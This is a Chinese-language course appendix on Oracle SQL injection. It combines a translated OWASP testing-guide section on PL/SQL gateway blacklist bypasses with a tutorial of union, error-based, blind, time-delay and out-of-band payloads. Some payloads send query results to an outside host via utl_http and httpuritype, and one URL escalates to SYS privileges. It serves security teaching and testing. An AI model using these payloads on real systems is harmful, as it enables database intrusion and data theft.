# 第8讲附章 Oracle SQL 注入

## OWASP WEB TEST GUIDE 
### 概述

基于Web的PL/SQL应用通过PL/SQL网关运行，这一网关可以讲web请求转换为数据库查询。Oracle已经开发了很多软件，从早期web监听产品到Apache ```mod_plsql```模块，再到XML Database（XDB）web服务器。所有的产品有其自身的特点和问题，本节将尽可能的分析这些问题。使用PL/SQL网关的产品包括但不限于：
- Oracle HTTP Server
- eBusiniess Suite
- Portal
- HTMLDB
- WebDB
- Oracle Application Server

### 如何测试

#### PL/SQL网关如何工作？
本质上，PL/SQL网关扮演了一个代理服务器的角色，它接收用户web请求并传递到数据库服务器去执行。基本步骤如下：
- 某Web Server接收来自客户端的请求，判定是否应该由PL/SQL网关处理
- PL/SQL网关处理从原始请求中提取出的package name，procedure，variables
- 被请求的package和procedure被一个匿名PL/SQL块所包装，送给数据库服务器
- 数据服务器执行过程，并把结果以HTML形式送给网关
- 网关把响应发送给web服务器，再传递给客户。

注意：PL/SQL 代码不存放在web server上，而是存放在数据库服务器上。这意味着当 PL/SQL 网关中的任何缺陷或在 PL/SQL 应用中的漏洞被攻击者利用时，攻击者会获得数据库服务器的访问权，而不再有防火墙等机制阻拦他。

PL/SQL web应用的URLs大多可以简单识别，通常它们以下列形式表达数据库访问描述（xyz是某个字符串）：
- http://www.example.com/pls/xyz
- http://www.example.com/xyz/owa
- http://www.example.com/xyz/plsql

上面第2，3种是老一点的应用中常见的url，第1种是最近版本的应用中使用的形式。在```plsql.conf```这个Apache 配置文件中，```/pls```是默认的PLS模块存放位置。这个位置可以改变。URL中没有文件扩展名，这可能意味着存在Oracle PL/SQL网关，考虑下列URL: ```http://www.server.com/aaa/bbb/xxxxx.yyyyy```

如果 xxxx.yyyy 这个字符串依次被 ebank.home, store.welcome, auth.login, or books.search 所替代，那么当前 web server 就很有可能使用了 PL/SQL 网关。有时url中出现的字符串是用户名和他名下的package和procedure，例如：```http://www.server.com/pls/xyz/webuser.pkg.proc```。在这个URL中，xyz是数据库访问描述符（Database Access Descriptor, or DAD.），DAD指明了数据库服务器，使PL/SQL网关可以连接它。DAD包括诸如：TNS连接字符串、user ID，密码、认证方法等。在许多近期版本中，DAD在```dads.conf```这个Apache 配置文件中被定义，而在老版本中它位于```wdbsvr.app```中。一些默认的DADs如下：
```
SIMPLEDAD
HTMLDB
ORASSO
SSODAD
PORTAL
PORTAL2
PORTAL30
PORTAL30_SSO
TEST
DAD
APP
ONLINE
DB
OWA
```

#### 判断PL/SQL是否在运行

对服务器执行评测时，首先要知道的是评测对象使用了什么技术。识别基于web的PL/SQL应用相对容易，首先它的URL有一定特点，上面已经介绍了。此外下面的测试可以辅助判断PL/SQL网关的存在：
##### 服务器响应头部
服务器响应头部是一个很好揭示了当前服务器是否为运行的PL/SQL网关。下面的表中列出了典型的响应头：
```
Oracle-Application-Server-10g
Oracle-Application-Server-10g/10.1.2.0.0 Oracle-HTTP-Server
Oracle-Application-Server-10g/9.0.4.1.0 Oracle-HTTP-Server
Oracle-Application-Server-10g OracleAS-Web-Cache-10g/9.0.4.2.0 (N)
Oracle-Application-Server-10g/9.0.4.0.0
Oracle HTTP Server Powered by Apache
Oracle HTTP Server Powered by Apache/1.3.19 (Unix) mod_plsql/3.0.9.8.3a
Oracle HTTP Server Powered by Apache/1.3.19 (Unix) mod_plsql/3.0.9.8.3d
Oracle HTTP Server Powered by Apache/1.3.12 (Unix) mod_plsql/3.0.9.8.5e
Oracle HTTP Server Powered by Apache/1.3.12 (Win32) mod_plsql/3.0.9.8.5e
Oracle HTTP Server Powered by Apache/1.3.19 (Win32) mod_plsql/3.0.9.8.3c
Oracle HTTP Server Powered by Apache/1.3.22 (Unix) mod_plsql/3.0.9.8.3b
Oracle HTTP Server Powered by Apache/1.3.22 (Unix) mod_plsql/9.0.2.0.0
Oracle_Web_Listener/4.0.7.1.0EnterpriseEdition
Oracle_Web_Listener/4.0.8.2EnterpriseEdition
Oracle_Web_Listener/4.0.8.1.0EnterpriseEdition
Oracle_Web_listener3.0.2.0.0/2.14FC1
Oracle9iAS/9.0.2 Oracle HTTP Server
Oracle9iAS/9.0.3.1 Oracle HTTP Server
```
##### NULL测试
在PL/SQL中，null是完全可接受的表达式。例如：
```
SQL> BEGIN
2  NULL;
3  END;
4  /
PL/SQL procedure successfully completed.
```
我们使用这一点来测试是否服务器为运行的PL/SQL网关。简单地在DAD后增加NULL，以及增加NOSUCHPROC:
```
http://www.example.com/pls/dad/null
http://www.example.com/pls/dad/nosuchproc
```
如果服务器对上述第一个请求响应以200 ok，而对第二个请求响应以404 not found，那么就说明服务器为PL/SQL网关。

##### 访问已知的包

老版本的PL/SQL网关会直接访问packages，形成PL/SQL web toolkit，例如OWA和HTP包。这些包中之一是OWA_UTIL包，这个包包含了一个叫做SIGNATURE的过程，而且它会以html形式输出一个PL/SQL签名。那么发出下列请求：```http://www.example.com/pls/dad/owa_util.signature```，则会返回下列响应：```"This page was produced by the PL/SQL Web Toolkit on date"``` 或 ```"This page was produced by the PL/SQL Cartridge on date"```.

如果你没有得到上述响应，而得到的是403 Forbidden响应，那么你还是可以推断PL/SQL网关正在运行，这是新版本应用中的提示。

##### 访问数据库中任意的PL/SQL包
可以利用数据库服务器默认安装在PL/SQL包中利用漏洞。如何执行此操作取决于PL/SQL网关的版本。在PL/SQL网关的早期版本中，没有什么可以阻止攻击者访问数据库服务器中的任意PL / SQL程序包。我们之前提到了该OWA_UTIL程序包。这可以用于运行任意SQL查询：

```http://www.example.com/pls/dad/OWA_UTIL.CELLSPRINT? P_THEQUERY=SELECT+USERNAME+FROM+ALL_USERS```

跨站点脚本攻击可以通过HTP软件包发起：

```http://www.example.com/pls/dad/HTP.PRINT?CBUF=<script>alert('XSS')</script>```

显然这很危险，因此Oracle引入了PLSQL排除列表以防止直接访问此类危险过程。禁止的项目包括以```SYS.*```、```DBMS_*```开头的任何请求，禁止任何含有```HTP.*```或```OWA*```的请求。然后绕过这些黑名单是有可能的。此外，排除列表不会阻止访问```CTXSYS```和```MDSYS```模式或其他模式中的程序包，因此可以利用以下程序包中的缺陷：

```http://www.example.com/pls/dad/CXTSYS.DRILOAD.VALIDATE_STMT?SQLSTMT=SELECT+1+FROM+DUAL```

如果数据库服务器受上述漏洞的影响，则将返回空白的HTML页面，响应为200 OK（CVE-2006-0265），这证明了当前所用的技术为oracle的pl/sql 服务器。

##### 绕过 PL/SQL 排除列表（黑名单）
甲骨文试图修复绕过排除列表缺陷的次数令人难以置信。Oracle产生的每个补丁都成为新旁路技术的牺牲品。可以参考：https://seclists.org/fulldisclosure/2006/Feb/11

###### 方法1
在Oracle首次引入PL / SQL排除列表，防止攻击者访问任意PL / SQL程序包时，可以通过在模式/程序包名称前添加十六进制编码的换行符或空格或制表符来略过它：
```
http://www.example.com/pls/dad/%0ASYS.PACKAGE.PROC
http://www.example.com/pls/dad/%20SYS.PACKAGE.PROC
http://www.example.com/pls/dad/%09SYS.PACKAGE.PROC
```

###### 方法2
对于PL/SQL网关的新版本应用，攻击者可以在schema/package名称前添加标签来绕过黑名单。在PL/SQL中，指向代码行的标签的形式如下（代码可由GOTO语句跳转）：```<<NAME>>```

```http://www.example.com/pls/dad/<<LABEL>>SYS.PACKAGE.PROC```

###### 方法3
只需将 schema/package 的名称放在双引号中，即可使攻击者绕过排除列表。注意，这在Oracle应用服务器10g是行不通的，因为oracle 10g 会在发送请求到数据库服务器前，把用户的请求转换成小写字符串，而引号字符是大小写敏感的，这样```SYS```和```sys```就是两个不同的字符串，这会导致404报错。较10g早期的版本可以使用如下的请求url:
```http://www.example.com/pls/dad/"SYS".PACKAGE.PROC```

###### 方法4
取决于web服务器和数据库服务器使用的字符集，一些字符可以被转义。例如数据库服务器遇到```ÿ```可能转换为```y```。又例如，经常转换为大写字母```Y```的是Macron字符```0xAF```。下面是一个可能使攻击者绕过排除列表的例子：
```
http://www.example.com/pls/dad/S%FFS.PACKAGE.PROC 
http://www.example.com/pls/dad/S%AFS.PACKAGE.PROC
```
###### 方法5
一些PL/SQL网关的版本可以使用反斜杠```0x5c```绕过，例如：
```http://www.example.com/pls/dad/%5CSYS.PACKAGE.PROC```

###### 方法6

最复杂的绕过方法使最近oracle打补丁防止的绕过方法。例如我们的url请求如下：```http://www.example.com/pls/dad/foo.bar?xyz=123```，这台应用服务器可能在数据库服务器上执行下列代码：

```sql
declare
    rc__ number;
    start_time__ binary_integer;
    simple_list__ owa_util.vc_arr;
    complex_list__ owa_util.vc_arr;
begin
    start_time__ := dbms_utility.get_time;
    owa.init_cgi_env(:n__,:nm__,:v__);
    htp.HTBUF_LEN := 255;
    null;
    null;
    simple_list__(1) := 'sys.%';
    simple_list__(2) := 'dbms\_%';
    simple_list__(3) := 'utl\_%';
    simple_list__(4) := 'owa\_%';
    simple_list__(5) := 'owa.%';
    simple_list__(6) := 'htp.%';
    simple_list__(7) := 'htf.%';
    if ((owa_match.match_pattern('foo.bar', simple_list__, complex_list__, true))) then
        rc__ := 2;
    else
        null;
        orasso.wpg_session.init();
        foo.bar(XYZ=>:XYZ);
        if (wpg_docload.is_file_download) then
            rc__ := 1;
            wpg_docload.get_download_file(:doc_info);
            orasso.wpg_session.deinit();
            null;
            null;
            commit;
        else
        rc__ := 0;
        orasso.wpg_session.deinit();
        null;
        null;
        commit;
        owa.get_page(:data__,:ndata__);
        end if;
    end if;
    :rc__ := rc__;
    :db_proc_time__ := dbms_utility.get_time—start_time__;
end;
```

注意上面的第19行和24行。在第19行，使用了一个已知的坏字符串列表检查用户请求。如果请求中不包含坏字符，那么会执行第24行的过程。XYZ参数会以绑定值传递。

如果我们把请求修改为：```http://server.example.com/pls/dad/INJECT'POINT```

那么下面的PL/SQL将会被执行：
```sql
..
simple_list__(7) := 'htf.%';
if ((owa_match.match_pattern('inject'point', simple_list__ complex_list__, true))) then
    rc__ := 2;
else
    null;
    orasso.wpg_session.init();
    inject'point;
..
```

执行后产生了一个错误，错误日志为：```“PLS-00103: Encountered the symbol ‘POINT’ when expecting one of the following. . .”``` 这样我们就有了注入任意的SQL的一种方法，可以用来绕过黑名单。首先攻击者需要找到一个无参数的且不会被黑名单过滤的PL/SQL过程。有不少这类package，例如：
```
JAVA_AUTONOMOUS_TRANSACTION.PUSH
XMLGEN.USELOWERCASETAGNAMES
PORTAL.WWV_HTP.CENTERCLOSE
ORASSO.HOME
WWC_VERSION.GET_HTTP_DATABASE_INFO
```
攻击者选择上面列表中确实能在目标系统中使用的一个，例如能返回200 ok的那个。作为一各尝试，请求可能如下：```http://server.example.com/pls/dad/orasso.home?FOO=BAR```。

服务器可能会返回一个404 file not found 响应，因为```orasso.home```过程没有要求参数，但请求中有一个参数。然而，在404返回前，下列的PL/SQL会被执行：
```sql
..
..
if ((owa_match.match_pattern('orasso.home', simple_list__, complex_list__, true))) then
rc__ := 2;
else
null;
orasso.wpg_session.init();
orasso.home(FOO=>:FOO);
..
..
```

注意，攻击者查询字符串中的FOO，攻击者可以使用这种方法允许任意的SQL。首先需要将方括号括起来：```http://server.example.com/pls/dad/orasso.home?);--=BAR```

这样会导致下列PL/SQL被执行：
```
..
orasso.home();--=>:);--);
..
```

注意，在双减号后的任何字符会被认为是注释。这个请求会引起内部服务器错误，因为一个绑定变量不再有用，所以攻击者需要把他加到后面。绑定变量是运行任意PL/SQL的关键。此时我们已使用HTP.PRINT打印BAR，需要绑定变量：1例如：
```http://server.example.com/pls/dad/orasso.home?);HTP.PRINT(:1);--=BAR```

这会返回一个含有BAR的200 ok响应。等号后的```BAR```为插入到绑定变量中的数据。使用同样的技术，可以访问```owa_util.cellsprint```:
```http://www.example.com/pls/dad/orasso.home?);OWA_UTIL.CELLSPRINT(:1);--=SELECT+USERNAME+FROM+ALL_USERS```

可执行的SQL语句包括DML和DLL语句，攻击者插入到执行立即数到：1:

```http://server.example.com/pls/dad/orasso.home?);execute%20immediate%20:1;--=select%201%20from%20dual```

注意，输出不会被显示。它可能利用渗透任何属于SYS的PL/SQL注入漏洞，这样能使攻击者获得完整的后台数据库控制权。例如，接下来的URL利用了```DBMS_EXPORT_EXTENSION```中的SQL注入漏洞:
```
http://www.example.com/pls/dad/orasso.home?);
execute%20immediate%20:1;--=DECLARE%20BUF%20VARCHAR2(2000);%20BEGIN%20
BUF:=SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('INDEX_NAME','INDEX_SCHEMA','DBMS_OUTPUT.PUT_LINE(:p1); EXECUTE%20IMMEDIATE%20''CREATE%20OR%20REPLACE%20
PUBLIC%20SYNONYM%20BREAKABLE%20FOR%20SYS.OWA_UTIL'';
END;--','SYS',1,'VER',0);END;
```

#### 评估自定义PL / SQL Web应用程序
在黑盒安全性评估期间，自定义PL / SQL应用程序的代码不可见，但仍需要评估其安全漏洞。

##### 测试SQL注入
应该测试每个输入参数的SQL注入缺陷。这些很容易找到和确认。找到它们就像将单引号嵌入参数中并检查错误响应（响应中包括404 Not Found错误）一样容易。可以使用串联运算符（concatenation）来确认是否存在SQL注入。

例如，假设有一个书店 PL / SQL Web应用程序，该应用程序允许用户搜索给定作者的书：

```http://www.example.com/pls/bookstore/books.search?author=DICKENS```

如果此请求返回查尔斯·狄更斯的书，但

```http://www.example.com/pls/bookstore/books.search?author=DICK'ENS```

返回错误或404，则可能存在SQL注入缺陷。可以通过使用串联运算符来确认：

```http://www.example.com/pls/bookstore/books.search?author=DICK'||'ENS```

如果此请求返回了Charles Dickens的书，则表明您已确认存在SQL注入漏洞。

### 工具
- SQLInjector
- Orascan (Oracle Web Application VA scanner), NGS SQuirreL (Oracle RDBMS VA Scanner)


## 一篇文章入门Oracle注入 建议收藏

https://mp.weixin.qq.com/s?__biz=MzAwMjA5OTY5Ng==&mid=2247487986&idx=1&sn=2028a269ff5dad1b31708847db34c8da&chksm=9acec16dadb9487bf16a5478907bdf176db102c832650f69bb77ba35c7e312fbb51023f20dec&mpshare=1&scene=24&srcid=08192W9s4uIcvTfwjdNEfZSi&sharer_sharetime=1597832503200&sharer_shareid=9530e1864f9ccae4832cd88b98041964&exportkey=AYbkIpx7Lc%2B3DdCWUS8fTys%3D&pass_ticket=nQcihpZIrgq%2F0dgwRHBaNkcP2TMN7UhBJZ%2BftGUPWoYWtdYy24W%2FTS9YUwwG9Jh%2B&wx_header=0#rd

### Oracle 测试环境安装

目前使用docker比较方便：

```
# 拉取镜像
$ docker pull deepdiver/docker-oracle-xe-11g

# 启动容器
$ docker run --rm -d --name oracledb -p 1002:22 -p 1521:1521 deepdiver/docker-oracle-xe-11g

# 可以选择进入docker操作，不需要将docker 22端口映射出来。
$ docker exec -it oracledb bash
```

### Oracle 基础概念

- dual是Oracle中的虚表，任何用户可以读取，常用在没有目标表的select语句中。
- Oracle数据库使用3种语言：SQL、PL/SQL、Java。

#### 实例

一个Oracle实例（Oracle Instance）有一系列的后台进程和内存结构组成。一个数据库可以有n个实例。

#### 用户  
Oracle数据库的基本单位，等同于Mysql中的库。
- Mysql：当前数据库下有N张表  <=> Oracle：当前用户下有N张表。

#### 表空间  

- 表空间是Oracle对物理数据库上相关数据文件（ORA或者DBF文件）的逻辑映射。

- 一个数据库在逻辑上被划分成一到若干个表空间，每个表空间包含了在逻辑上相关的一组结构。

- 每个数据库至少有一个表空间（称之为system表空间）。
- 每个表空间由同一磁盘上的一个或多个文件组成，这些文件叫数据文件（datafile）。
- 一个数据文件只能属于一个表空间。

#### 数据文件（dbf,ora）  
- 数据文件是数据库的物理存储单位。
- 表空间与数据文件是一对多的关系（用户与表空间也是一对多的关系），而数据文件只能属于一个表空间，删除数据文件需先删除该文件所属的表空间。
- 表的数据，是由用户放入某一个表空间的，而这个表空间会随机把这些表数据放到一个或多个数据文件中。


#### Oracle数据库中常用角色
- connect --连接角色，基本角色
- resource --开发者角色
- dba --超级管理员角色

- Oracle数据库存在默认用户：scott，密码：tiger。需要超级管理员权限用户解锁。


#### 数据类型
- varchar, varchar2  表示一个字符串。
- NUMBER    NUMBER(n)表示一个整数，长度是n；
- NUMBER(m,n)表示一个小数，总长度m，小数：n，整数是m-n。eg: NUMBER(4,2) 表示最大可以存储数字为99.993. 
- DATA      表示日期类型
- CLOB      大对象，表示大文本数据类型，可存4G
- BLOB      大对象，表示二进制数据，可存4G

#### 其他知识点
表。
- ALL_TABLES描述当前用户可访问的关系表。（类似Mysql中的information_schema.tables）
- DBA_ALL_TABLES描述数据库中的所有对象表和关系表。其列与中的列相同ALL_ALL_TABLES。
- ALL_ALL_TABLES 描述当前用户可访问的对象表和关系表。
- USER_ALL_TABLES描述当前用户拥有的对象表和关系表。
- DBA_TABLES描述数据库中的所有关系表，其列与ALL_TABLES中的列相同，查询条件：DBA权限用户。

#### Oracle SQL语法

查看当前连接用户:
```SQL> select user from dual;```

创建用户名为sqli密码为pentest的用户:
```SQL> create user sqli identified by pentest;```

给新创建的用户授权:
- connect角色,保证该用户可以连接数据库;
- resource角色：该用户可以使用数据库资源.
  
```SQL> grant connect,resource to sqli;```

删除用户：当前连接数据库的用户必须具有删除用户权限（如sys）

创建表空间（需要超级管理员权限）
```sql
SQL> create tablespace pentest
  2  datafile '/tmp/pentest.dbf'
  3  size 100m
  4  autoextend on
  5  next 10m;
```

删除表空间
```SQL> drop tablespace pentest;```

注意：删除表空间后，数据文件依旧存在。

创建users表：
```sql
SQL> create table users(
  2  id number(10),
  3  uname varchar2(16),
  4  pwd varchar2(32)
  5  )
  6  ;
```
添加列:
```sql
SQL> alter table users add email varchar2(40);
```

修改列数据类型:
```SQL> alter table users modify email char(40);```

修改列的名称:
```SQL> alter table users rename column email to sex;```

删除列:
```SQL> alter table users drop column sex;```

插入数据（values字符串不能使用双引号）:
```SQL> insert into users (id,uname,pwd) values(1,'admin','ab71giedas98g1o2dasgd12e98g');```

修改数据:
```update users set uname='administrator';```

删除数据:
```delete from users where uname='administrator';```

生成序列：
```SQL> create sequence s_users;```
注意：默认从1开始：依次递增，主要用来给主键赋值使用。序列不真的属于任何表，但是可以逻辑和表做绑定。


插入数据：
```SQL> insert into users (id,uname,pwd) values(s_users.nextval,'ceshi','d81bojd09sha1onpmd09a');```


查询数据：
```SQL> select * from users;```

联合查询：
**注：Oracle中表达式必须具有与对应表达式相同的数据类型，且在Oralce数据库中要求select语句后必须指定要查询的表名（使用虚表dual即可)

```SQL> select * from users where id=2 union select null,null,null from dual;```



### Orcale数据库注入

#### 特殊字符、操作函数

- ```||```, 双直线是Oracle中的字符串拼接运算符。 ```select 'pen'||'test' from dual;```
- ```rownum```分页操作（mysql中的limit）```SQL> select * from users where rownum<2; ```
  - rownum后面可跟```<,<=,!=```
- ```--```,```-- -```,```--空格```,```/*  */``` 均是Oracle支撑的注释符
- oracle数据库是大小写敏感的。

#### 信息查询

获取版本信息：
- ```select banner from v$version;``` 

使用正则匹配，精确获取信息：
- ```select banner from v$version where banner like 'Oracle%';``` 

获取当前用户：
- ```select user from dual;```

获取数据库所有用户：
```select username from all_users;```

```SELECT name FROM sys.user$; ```-- 需要高权限

获取当前用户权限
```SQL> select * from session_privs;```

获取当前用户所拥有权限下的所有数据库
```SQL> select distinct owner,table_name from all_tables;```

获取指定表的字段（注意这里的table_name全部大写）
```SQL> select column_name from all_tab_columns where table_name='USERS';```


Oracle提供了一个名为的内置命名空间USERENV，用于描述当前会话。

以下语句返回登录到数据库的用户的名称：

```sql
SQL> select SYS_CONTEXT('USERENV','SESSION_USER') from dual;SYS_CONTEXT('USERENV','SESSION_USER')


SQLISQL> select SYS_CONTEXT('USERENV','AUTHENTICATED_IDENTITY') from dual;SYS_CONTEXT('USERENV','AUTHENTICATED_IDENTITY')

```

获取当前数据库名
```SQL> select * from global_name;```

说明：GLOBAL_NAME 包含一行，显示当前数据库的全局名称。

实现mysql的group_concat:
```SQL> select listagg(column_name,'~') within group (order by column_name) from user_tab_columns;```

```LISTAGG(COLUMN_NAME,'~')WITHIN GROUP(ORDERBY COLUMN_NAME)```

说明：LISTAGG 对 ORDER BY 子句中指定的每个组内的数据进行排序，然后合并度量列的值。measure_expr可以是任何表达。度量列中的空值将被忽略。


USER_TABLES描述当前用户拥有的关系。


获取表名：
```sql
SQL> select * from users where id=2 union select null,null,(select listagg(table_name,'~') within group(order by 1) from all_tables where owner='SQLI') from dual;
```

获取指定表的字段名：
```sql
SQL> select * from users where id=2 union select null,null,(select listagg(column_name,':') within group(order by 1) from all_tab_columns where table_name='USERS') from dual;
```

获取指定字段内容:
```sql
SQL> select * from users where id=2 union select null,null,(select listagg(uname||'&'||pwd,':') within group(order by 1) from users where rownum=1) from dual;
```

#### 报错注入

##### 利用 UTL_INADDR 程序包功能实现报错注入

报错注入的本质就是使数据库返回一个语法等错误，并且返回错误中的某些内容我们可控，借此来获取我们需要的信息。

UTL_INADDR 程序包提供了一个PL/SQL过程来支持Internet寻址。它提供了一个API，用于检索本地和远程主机的主机名和IP地址。

UTL_INADDR 程序包是调用者的权限程序包，这意味着必须connect在分配给他或她希望连接到的远程网络主机的访问控制列表中向调用用户授予特权。

可以使用该包中的GET_HOST_ADDRESS ，GET_HOST_NAME函数来进行报错注入。

调用语法：
```UTL_INADDR.GET_HOST_NAME (ip  IN VARCHAR2 DEFAULT NULL)```

返回：host_name VARCHAR2;

由于GET_HOST_ADDRESS函数所需参数类型是varchar2，且报错时会将参数表达式结果返回，因此可以借此实现报错注入。

还可以使用GET_HOST_NAME函数进行报错攻击。

需要注意的是，执行UTL_INADDR软件包需要拥有connect权限的用户。

##### 利用 ctxsys.drithsx.sn 实现报错注入

```SQL> select * from users where id=1 and 1=(select ctxsys.drithsx.sn(1,(select user from dual))from dual);```

##### 利用 ctxsys.ctx_report.token_type 

这是一个辅助功能，可将英语名称转换为数字标记类型。

使用方法：
```sql
function token_type(
  index_name in varchar2,
  type_name  in varchar2
) return number;

SQL> select ctxsys.ctx_report.token_type((select user from dual),1) from dual;

```

结果如下：
```sql
select ctxsys.ctx_report.token_type((select user from dual),1) from dual
       *
ERROR at line 1:
ORA-20000: Oracle Text error:
DRG-10502: index SQLI does not exist
ORA-06512: at "CTXSYS.DRUE", line 160
ORA-06512: at "CTXSYS.CTX_REPORT", line 711
这种类似的可以用来报错注入的函数很多，举个例子：
SQL> select ctxsys.ctx_report.token_info('aa','xx',1)from dual;
ERROR:
ORA-20000: Oracle Text error:
DRG-10502: index AA does not exist
ORA-06512: at "CTXSYS.DRUE", line 160
ORA-06512: at "CTXSYS.CTX_REPORT", line 615
ORA-06512: at line 1

no rows selected
```

##### 利用 dbms_xdb_version.checkin

此函数检入已签出的VCR，并返回新创建版本的资源ID。

CHECKIN函数用法：DBMS_XDB_VERSION.CHECKIN(   pathname VARCHAR2) 
- 返回：DBMS_XDB.resid_type;  
- 如果路径名不存在，则会引发异常。

例如：
```SQL> select * from users where id=1 and '0x2e'=(select dbms_xdb_version.checkin((select user from dual))from dual);select * from users where id=1 and '0x2e'=(select dbms_xdb_version.checkin((select user from dual))from dual)```

结果如下：
```*ERROR at line 1:ORA-31001: Invalid resource handle or path name "SQLI"```

需要注意使用二进制数据类型:
- dbms_xdb_version.makeversioned

MAKEVERSIONED函数用法：DBMS_XDB_VERSION.MAKEVERSIONED(   pathname   VARCHAR2) 
- 返回 DBMS_XDB.resid_type;
- 如果资源不存在，则会引发异常。
- 需要注意使用二进制数据类型

#### 盲注

decode函数用来比较:
```sql
SQL> select * from users where id=1 and 1=(select decode(user,'SQLI',1) from dual);
SQL> select * from users where id=1 and 'S'=(select substr(user,1,1)from dual);
```
注意：需要注意大小写的问题

延时注入（用来判断注入点）：
```SQL> select count(*) from all_objects;```

利用了oracle管道功能接收消息的函数RECEIVE_MESSAGE，实现延时注入:
```sql
DBMS_PIPE.RECEIVE_MESSAGE (
   pipename     IN VARCHAR2,
   timeout      IN INTEGER      DEFAULT maxwait)
RETURN INTEGER;
```

简单的使用
```SQL> select dbms_pipe.receive_message('aaa',3) from dual;```

结果：
```DBMS_PIPE.RECEIVE_MESSAGE('AAA',3)```

```SQL> select dbms_pipe.receive_message('aaa',(decode((select user from dual),'SQLI',3))) from dual;```


带外攻击OOB（Out Of Band）:
- 既然是带外攻击，自然需要connect
```sql
utl_http.request
UTL_HTTP.REQUEST (
   url              IN VARCHAR2,
   proxy            IN VARCHAR2 DEFAULT NULL,
   wallet_path      IN VARCHAR2 DEFAULT NULL,
   wallet_password  IN VARCHAR2 DEFAULT NULL)
RETURN VARCHAR2;

SQL> select utl_http.request('http://ip/?result='||(select user from dual))from dual;
```

我这里测试没有成功，报错ORA-00904: : invalid identifier，可能是版本问题。

utl_inaddr.get_host_address
报错注入那个函数，不过多介绍了
```SQL> select utl_inaddr.get_host_address((select user from dual)||'.o6xgjz.dnslog.cn')from dual;```


#### DBMS_LDAP软件包使您可以从LDAP服务器访问数据。

FUNCTIONN INIT():	
- init()用LDAP服务器初始化会话。这实际上建立了与LDAP服务器的连接。
- 语法: FUNCTION init      (hostname IN VARCHAR2,portnum  IN PLS_INTEGER)RETURN SESSION;

- HTTPURITYPE
可以创建UriType列，并在其中存储DBURITYPE，XDBURITYPE或HTTPURITYPE的实例。还可以定义自己的UriType子类型来处理不同的URL协议。



会请求httpuritype所指定的uri的函数(带外的函数)有:
- GETCONTENTTYPE() 作用：返回URI指向的文档的内容类型。
- GETCLOB() 作用：返回位于HTTP URL地址的CLOB。
- GETBLOB() 作用：返回位于URL指定的地址的BLOB。
  - ```select httpuritype.createuri('http://xxx.o6xgjz.dnslog.cn').getblob() from dual;```
- GETXML() 作用：返回位于URL指定的地址的。
  - ```select httpuritype.createuri('http://xxx.o6xgjz.dnslog.cn').getxml() from dual;```